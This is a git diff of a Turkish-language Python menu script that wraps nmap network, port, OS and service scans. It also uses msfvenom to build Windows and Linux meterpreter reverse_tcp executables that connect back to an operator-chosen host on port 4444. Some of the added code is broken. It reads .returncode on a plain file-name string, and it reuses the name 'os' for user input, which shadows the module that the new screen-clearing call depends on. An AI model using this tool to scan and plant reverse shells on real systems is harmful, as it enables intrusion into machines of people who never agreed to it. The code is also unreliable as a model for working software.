@@ -2,8 +2,13 @@ import ipaddress
 import subprocess
 import platform
 import sys
+import os
+
+def ekran_temizle():
+    os.system("clear")
 
 def ping_at(ip):
+    ekran_temizle()
     # İşletim sistemine göre ping parametresi
     if platform.system().lower() == "windows":
         param = "-n"
@@ -24,6 +29,7 @@ def ping_at(ip):
         print("❌ Ping başarısız!")
 
 def ag_tara(network):
+    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-sn", network],
         stdout=subprocess.PIPE,
@@ -33,6 +39,7 @@ def ag_tara(network):
     print(result.stdout)
 
 def port_tara(ip):
+    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-p-", ip],
         stdout=subprocess.PIPE,
@@ -42,6 +49,7 @@ def port_tara(ip):
     print(result.stdout)
 
 def os_tara(ip):
+    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-O", ip],
         stdout=subprocess.PIPE,
@@ -51,6 +59,7 @@ def os_tara(ip):
     print(result.stdout)
 
 def sv_tara(ip):
+    ekran_temizle()
     result = subprocess.run(
         ["nmap", "-sV", ip],
         stdout=subprocess.PIPE,
@@ -60,6 +69,7 @@ def sv_tara(ip):
     print(result.stdout)
 
 def payloadWin(Lip, dosya):
+    ekran_temizle()
     result = subprocess.run(
         ["msfvenom", "-p", "windows/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","exe","-o", dosya],
         stdout=subprocess.PIPE,
@@ -69,6 +79,7 @@ def payloadWin(Lip, dosya):
     print(result.stdout)
 
 def payloadLin(Lip, dosya):
+    ekran_temizle()
     result = subprocess.run(
         ["msfvenom", "-p", "payload/linux/x64/meterpreter/reverse_tcp","LHOST="+Lip, "LPORT=4444", "-f","elf","-o", dosya],
         stdout=subprocess.PIPE,
@@ -77,7 +88,7 @@ def payloadLin(Lip, dosya):
     )
     print(result.stdout)    
 
-# ---- IP DOĞRULAMA KISMI ----
+
 print("""
             ----------------------------------
             |                                |
@@ -88,6 +99,7 @@ print("""
             ---------------------------------- 
       """)
 while True:
+    ekran_temizle()
     print("""
       -------------------- Menü --------------------
       |                                            |
@@ -120,7 +132,8 @@ while True:
               |  3) İşletim Sistemi Taraması               |
               |  4) Servis Versiyon Taraması               |
               |  5) Payloads Oluştur                       |
-              |  6) Çıkış                                  |
+              |  6) Geri                                   |
+              |  7) Çıkış                                  |
               |                                            |
               ----------------------------------------------
              """)
@@ -129,7 +142,7 @@ while True:
                 ping_at(ip)
             elif secim2 == "2":
                 port_tara(ip)
-            elif secim == "3":
+            elif secim2 == "3":
                 os_tara(ip)
             elif secim2 == "4":
                 sv_tara(ip)
@@ -137,11 +150,19 @@ while True:
                 os = input("İşletim Sistemi Seçiniz (1-Windows, 2-Linux): ")
                 Lip = input("Yerel İp: ")
                 dosya = input("Dosya Adı: ")
+                if dosya.returncode == 0:
+                   print("✅ Ping başarılı!")
+                else:
+                   print("❌ Ping başarısız!")
+            
                 if os == "1":
                     payloadWin(Lip, dosya)
                 elif os == "2":
-                    payloadLin(Lip, dosya)        
+                    payloadLin(Lip, dosya) 
             elif secim2 == "6":
+                break
+                               
+            elif secim2 == "7":
                 sys.exit()
     elif secim == "3":
         sys.exit()
